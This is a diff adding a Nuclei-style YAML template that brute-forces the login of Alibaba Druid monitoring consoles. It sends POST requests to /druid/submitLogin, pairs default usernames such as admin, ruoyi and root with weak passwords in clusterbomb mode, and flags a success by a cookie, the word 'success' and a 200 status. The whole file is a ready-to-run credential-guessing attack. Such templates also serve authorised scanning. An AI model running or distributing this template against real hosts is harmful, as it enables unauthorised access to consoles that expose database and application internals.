@@ -1,0 +1,53 @@
+id: druid-login-bruteforce
+
+info:
+  tags: druid-login-bruteforce
+  name: Druid 控制台登录爆破
+  author: xc
+  severity: high
+  description: |-
+    fofa: app="123"
+  
+http:
+  - raw:
+      - |
+        POST /druid/submitLogin HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Connection: close
+
+        loginUsername={{username}}&loginPassword={{password}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Set-Cookie"
+      - type: word
+        part: body
+        words:
+          - 'success'
+      - type: status
+        status:
+          - 200
+
+    payloads:
+      username:
+        - admin
+        - ruoyi
+        - druid
+        - root
+      password:
+        - 123456
+        - 12345
+        - ruoyi
+        - admin
+        - druid
+        - admin123
+        - admin888
+        - root
+
+    attack: clusterbomb
+    threads: 5
